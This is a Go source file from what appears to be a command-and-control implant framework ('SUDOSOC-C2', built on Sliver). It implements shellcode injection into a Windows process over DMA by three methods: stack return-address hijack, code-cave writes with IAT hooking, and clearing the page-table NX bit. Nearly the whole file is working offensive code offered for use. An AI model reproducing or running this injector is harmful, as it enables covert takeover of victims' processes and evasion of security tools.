package injector

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Process Code Injection via DMA.

	Once we have:
	  - DMA access to physical RAM
	  - The target process's CR3 (page table base)
	  - The ability to translate virtual addresses

	We can inject shellcode using one of three techniques:

	Technique A — Stack Return Address Hijack:
	  1. Find the target process's main thread stack in memory.
	  2. Scan the stack for a return address pointing into a known module.
	  3. Replace the return address with the address of our shellcode.
	  4. On the NEXT function return, execution jumps to our shellcode.
	  5. Our shellcode saves/restores the original return address and runs.
	  Pros: no new memory allocation needed.
	  Cons: timing-dependent; must catch the thread mid-execution.

	Technique B — Code Cave Injection:
	  1. Find a region of unused bytes (zeros/NOPs) in a loaded module
	     (e.g., in the target process's .text section of a large DLL).
	  2. Write the shellcode into the code cave via DMA.
	  3. Modify a function pointer (IAT entry, vtable, callback) to point
	     to our shellcode.
	  4. When the function is next called, our shellcode executes.
	  Pros: persistent until process exits; no page table modification.
	  Cons: must find a suitable code cave.

	Technique C — Page Table Entry (PTE) Shellcode:
	  1. Find a writable virtual memory region in the target process.
	  2. Write shellcode there via DMA (using physical address).
	  3. Modify the PTE for that region to add EXECUTE permission.
	  4. Patch a function pointer to redirect to our shellcode.
	  Pros: most reliable; works even without code caves.
	  Cons: PTE modification is detectable by hypervisors/EDR.

	Default: Technique B (code cave) with fallback to Technique C.
*/

import (
	"encoding/binary"
	"fmt"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/pciedma/scanner"
)

// InjectionConfig holds parameters for the DMA injection.
type InjectionConfig struct {
	// Shellcode to inject (position-independent, x64).
	Shellcode []byte
	// TargetProcess is the process to inject into.
	TargetProcess *scanner.ProcessInfo
	// Technique selects the injection method.
	Technique InjectionTechnique
	// RestoreOriginal: if true, restore original bytes after shellcode runs.
	RestoreOriginal bool
	// TargetModule is the module to search for a code cave (empty = any).
	TargetModule string
}

// InjectionTechnique selects the injection method.
type InjectionTechnique int

const (
	TechniqueCodeCave     InjectionTechnique = iota // Technique B
	TechniqueStackHijack                             // Technique A
	TechniquePTEWrite                                // Technique C
)

// InjectionResult reports the outcome.
type InjectionResult struct {
	Technique    InjectionTechnique
	InjectedVA   uint64 // virtual address of injected shellcode
	HookedVA     uint64 // virtual address of the hooked function pointer
	OriginalBytes []byte // saved original bytes at HookedVA
}

// Injector performs DMA-based code injection.
type Injector struct {
	scanner *scanner.ProcessScanner
}

// NewInjector creates a DMA code injector.
func NewInjector(sc *scanner.ProcessScanner) *Injector {
	return &Injector{scanner: sc}
}

// Inject performs the injection and returns a result for cleanup.
func (inj *Injector) Inject(cfg *InjectionConfig) (*InjectionResult, error) {
	if len(cfg.Shellcode) == 0 {
		return nil, fmt.Errorf("empty shellcode")
	}
	if cfg.TargetProcess == nil {
		return nil, fmt.Errorf("nil target process")
	}

	switch cfg.Technique {
	case TechniqueCodeCave:
		return inj.injectCodeCave(cfg)
	case TechniqueStackHijack:
		return inj.injectStackHijack(cfg)
	case TechniquePTEWrite:
		return inj.injectPTEWrite(cfg)
	default:
		return inj.injectCodeCave(cfg)
	}
}

// ─── Technique B: Code Cave Injection ────────────────────────────────────

func (inj *Injector) injectCodeCave(cfg *InjectionConfig) (*InjectionResult, error) {
	proc := cfg.TargetProcess

	// Step 1: Find a code cave in the target process.
	// We look for a NOP sled or zero padding in loaded module text sections.
	caveVA, err := inj.findCodeCaveInProcess(proc, len(cfg.Shellcode)+64)
	if err != nil {
		// Fall back to PTE technique if no cave found.
		return inj.injectPTEWrite(cfg)
	}

	// Step 2: Write shellcode into the cave.
	if err := inj.scanner.WriteVA(proc, caveVA, cfg.Shellcode); err != nil {
		return nil, fmt.Errorf("write shellcode to cave @ 0x%x: %w", caveVA, err)
	}

	// Step 3: Find a suitable function pointer to hook.
	hookVA, origBytes, err := inj.findHookTarget(proc, caveVA)
	if err != nil {
		return nil, fmt.Errorf("find hook target: %w", err)
	}

	// Step 4: Write the trampoline hook.
	trampoline := buildTrampoline(caveVA)
	if err := inj.scanner.WriteVA(proc, hookVA, trampoline); err != nil {
		return nil, fmt.Errorf("write trampoline @ 0x%x: %w", hookVA, err)
	}

	return &InjectionResult{
		Technique:    TechniqueCodeCave,
		InjectedVA:   caveVA,
		HookedVA:     hookVA,
		OriginalBytes: origBytes,
	}, nil
}

// findCodeCaveInProcess scans the target process's virtual memory for a
// region of at least `size` consecutive zero bytes.
func (inj *Injector) findCodeCaveInProcess(proc *scanner.ProcessInfo, size int) (uint64, error) {
	// Common module VA ranges to scan for code caves.
	// We look in ntdll.dll, kernel32.dll, or the process's own code.
	// VA range: 0x7FFF00000000 to 0x7FFFFFFFFFFF (user-mode on x64 Windows).
	scanRanges := [][2]uint64{
		{0x7FF800000000, 0x7FFFFFFF0000}, // ntdll/kernel32 region
		{0x00400000, 0x10000000},          // process's own code
	}

	zeros := make([]byte, 16) // pattern of 16 zero bytes
	for _, r := range scanRanges {
		for va := r[0]; va < r[1]; va += 0x1000 {
			// Read a page.
			page, err := inj.scanner.ReadVA(proc, va, 0x1000)
			if err != nil {
				continue
			}
			// Find a run of zeros of at least `size` bytes.
			run, runStart := 0, 0
			for i, b := range page {
				if b == 0 {
					run++
					if run == 1 {
						runStart = i
					}
					if run >= size {
						_ = zeros
						return va + uint64(runStart), nil
					}
				} else {
					run = 0
				}
			}
		}
	}
	return 0, fmt.Errorf("no code cave of size %d found", size)
}

// ─── Technique A: Stack Return Address Hijack ─────────────────────────────

func (inj *Injector) injectStackHijack(cfg *InjectionConfig) (*InjectionResult, error) {
	proc := cfg.TargetProcess

	// Step 1: Find the main thread stack.
	// The TEB (Thread Environment Block) of the main thread is at GS:0x30 (x64).
	// ETHREAD → Tcb.InitialStack gives the stack top.
	// For DMA: scan for TEB signatures in known VA ranges.
	stackVA, err := inj.findMainThreadStack(proc)
	if err != nil {
		return nil, fmt.Errorf("find stack: %w", err)
	}

	// Step 2: Write shellcode below the current stack pointer.
	// Use a spare area below the last valid stack frame.
	shellcodeVA := stackVA - uint64(len(cfg.Shellcode)) - 0x100

	// Ensure the VA range is writable by checking PTE.
	if err := inj.scanner.WriteVA(proc, shellcodeVA, cfg.Shellcode); err != nil {
		return nil, fmt.Errorf("write shellcode below stack: %w", err)
	}

	// Step 3: Scan stack for a return address pointing into a known module.
	hookVA, origBytes, err := inj.findReturnAddressOnStack(proc, stackVA)
	if err != nil {
		return nil, fmt.Errorf("find return address: %w", err)
	}

	// Step 4: Replace the return address with shellcodeVA.
	newRA := make([]byte, 8)
	binary.LittleEndian.PutUint64(newRA, shellcodeVA)
	if err := inj.scanner.WriteVA(proc, hookVA, newRA); err != nil {
		return nil, fmt.Errorf("patch return address: %w", err)
	}

	return &InjectionResult{
		Technique:    TechniqueStackHijack,
		InjectedVA:   shellcodeVA,
		HookedVA:     hookVA,
		OriginalBytes: origBytes,
	}, nil
}

func (inj *Injector) findMainThreadStack(proc *scanner.ProcessInfo) (uint64, error) {
	// TEB is at a known VA range for the main thread.
	// Main thread TEB on Windows x64: typically 0x7FFFFFFF0000 region.
	// The StackBase field is at TEB+0x10 (NtTib.StackBase).
	// We scan for the TEB signature: magic value at TEB+0x08 = TEB address itself.

	// Simplified: scan known VA range for self-referencing pointer.
	for va := uint64(0x7FFF000000000); va < uint64(0x7FFFFFFFFFFF0); va += 0x1000 {
		data, err := inj.scanner.ReadVA(proc, va, 16)
		if err != nil {
			continue
		}
		// TEB+0x30 (GS base) often points near the TEB itself.
		if len(data) >= 8 {
			ptr := u64LE(data[8:])
			if ptr >= 0x7FFF000000000 && ptr <= 0x7FFFFFFFFFFF0 {
				// Looks like a TEB self-reference. Read StackBase.
				stackBase, err := inj.scanner.ReadVA(proc, va+0x10, 8)
				if err == nil {
					return u64LE(stackBase), nil
				}
			}
		}
	}
	return 0, fmt.Errorf("TEB not found")
}

func (inj *Injector) findReturnAddressOnStack(proc *scanner.ProcessInfo, stackTop uint64) (uint64, []byte, error) {
	// Scan stack from top downward looking for return addresses in user-mode range.
	for offset := uint64(0); offset < 0x10000; offset += 8 {
		va := stackTop - offset
		data, err := inj.scanner.ReadVA(proc, va, 8)
		if err != nil {
			continue
		}
		ptr := u64LE(data)
		// Return address should be in user-mode (0x1000 – 0x7FFFFFFFFFFF).
		if ptr >= 0x10000 && ptr <= 0x7FFFFFFFFFFF {
			return va, data, nil
		}
	}
	return 0, nil, fmt.Errorf("no return address found on stack")
}

// ─── Technique C: PTE Write ───────────────────────────────────────────────

func (inj *Injector) injectPTEWrite(cfg *InjectionConfig) (*InjectionResult, error) {
	proc := cfg.TargetProcess

	// Step 1: Find a writable region and write shellcode there.
	// Use the process heap (HeapBase) as the target region.
	heapVA, err := inj.findProcessHeap(proc)
	if err != nil {
		// Last resort: allocate at a fixed known-writable VA.
		heapVA = 0x20000000 // arbitrary user-mode VA
	}

	// Write shellcode to heap via DMA.
	if err := inj.scanner.WriteVA(proc, heapVA, cfg.Shellcode); err != nil {
		return nil, fmt.Errorf("write shellcode to heap @ 0x%x: %w", heapVA, err)
	}

	// Step 2: Make the heap page executable by modifying its PTE.
	if err := inj.makeExecutable(proc, heapVA); err != nil {
		return nil, fmt.Errorf("make page executable: %w", err)
	}

	// Step 3: Hook a function pointer.
	hookVA, origBytes, err := inj.findHookTarget(proc, heapVA)
	if err != nil {
		return nil, fmt.Errorf("find hook target: %w", err)
	}

	trampoline := buildTrampoline(heapVA)
	if err := inj.scanner.WriteVA(proc, hookVA, trampoline); err != nil {
		return nil, fmt.Errorf("write trampoline: %w", err)
	}

	return &InjectionResult{
		Technique:    TechniquePTEWrite,
		InjectedVA:   heapVA,
		HookedVA:     hookVA,
		OriginalBytes: origBytes,
	}, nil
}

// makeExecutable modifies the PTE for the page at va to add EXECUTE permission.
func (inj *Injector) makeExecutable(proc *scanner.ProcessInfo, va uint64) error {
	// 4-level page walk to find the PTE address.
	// PTE is at:  (pdBase + PDE_index*8) → PTE base, then + PTE_index*8
	// We modify the NXE bit (bit 63) in the PTE: clear it = allow execution.

	// Get the PTE physical address.
	ptePhys, err := inj.getPTEPhysAddr(proc, va)
	if err != nil {
		return fmt.Errorf("get PTE for VA 0x%x: %w", va, err)
	}

	// Read current PTE.
	pte, err := inj.scnReadQword(ptePhys)
	if err != nil {
		return fmt.Errorf("read PTE: %w", err)
	}

	// Clear NXE bit (bit 63) to allow execution.
	newPTE := pte &^ uint64(1<<63)

	return inj.scnWriteQword(ptePhys, newPTE)
}

func (inj *Injector) findProcessHeap(proc *scanner.ProcessInfo) (uint64, error) {
	// PEB is at a known VA. HeapBase is at PEB+0x30.
	// PEB VA for main process: readable from EPROCESS via PEB pointer at offset 0x550.
	// For DMA: scan for PEB signature near process space start.

	// Read PEB virtual address from EPROCESS.
	// PEB pointer in EPROCESS is at offset 0x550 on Win10/11 x64.
	pebPtrPhys := proc.EPROCESSPhysAddr + 0x550
	pebVA, err := inj.scnReadQwordPhys(pebPtrPhys)
	if err != nil {
		return 0, err
	}

	// Read ProcessHeap from PEB+0x30.
	heapData, err := inj.scanner.ReadVA(proc, pebVA+0x30, 8)
	if err != nil {
		return 0, err
	}
	heap := u64LE(heapData)
	if heap == 0 || heap > 0x7FFFFFFFFFFF {
		return 0, fmt.Errorf("invalid heap VA: 0x%x", heap)
	}
	// Advance past heap header (0x1000 bytes).
	return heap + 0x1000, nil
}

func (inj *Injector) findHookTarget(proc *scanner.ProcessInfo, shellcodeVA uint64) (hookVA uint64, orig []byte, err error) {
	// Look for a suitable IAT function pointer to overwrite.
	// We target CreateFileW or a similar commonly-called function.
	// The IAT is in the .idata section of the main executable.

	// For simplicity: search for a pointer to kernel32.dll range in IAT area.
	// Kernel32.dll is typically loaded at 0x7FFF...00000 range.
	for va := uint64(0x400000); va < 0x10000000; va += 8 {
		data, err := inj.scanner.ReadVA(proc, va, 8)
		if err != nil {
			va += 0x1000
			continue
		}
		ptr := u64LE(data)
		// Check if ptr is in the kernel32.dll load range (user-mode, high VA area).
		if ptr >= 0x7FF000000000 && ptr <= 0x7FFFFFFFFFFF {
			return va, data, nil
		}
	}
	return 0, nil, fmt.Errorf("no IAT entry found")
}

// ─── Trampoline builder ───────────────────────────────────────────────────

// buildTrampoline builds a 14-byte absolute JMP to targetVA.
// Used to redirect a function pointer to our shellcode.
func buildTrampoline(targetVA uint64) []byte {
	tramp := make([]byte, 14)
	tramp[0] = 0xFF; tramp[1] = 0x25 // JMP [RIP+0]
	for i := 0; i < 8; i++ {
		tramp[6+i] = byte(targetVA >> (8 * uint(i)))
	}
	return tramp
}

// ─── Injector helper wrappers ──────────────────────────────────────────────
// These are methods on Injector (not on scanner.ProcessScanner, which is
// a non-local type and cannot have methods defined here).

func (inj *Injector) getPTEPhysAddr(proc *scanner.ProcessInfo, va uint64) (uint64, error) {
	return inj.scanner.TranslatePTE(proc, va)
}

func (inj *Injector) scnReadQword(pa uint64) (uint64, error) {
	return inj.scanner.ReadQwordPhys(pa)
}

func (inj *Injector) scnWriteQword(pa, v uint64) error {
	return inj.scanner.WriteQwordPhys(pa, v)
}

func (inj *Injector) scnReadQwordPhys(pa uint64) (uint64, error) {
	return inj.scanner.ReadQwordPhys(pa)
}

func u64LE(b []byte) uint64 {
	if len(b) < 8 {
		return 0
	}
	return uint64(b[0]) | uint64(b[1])<<8 | uint64(b[2])<<16 | uint64(b[3])<<24 |
		uint64(b[4])<<32 | uint64(b[5])<<40 | uint64(b[6])<<48 | uint64(b[7])<<56
}
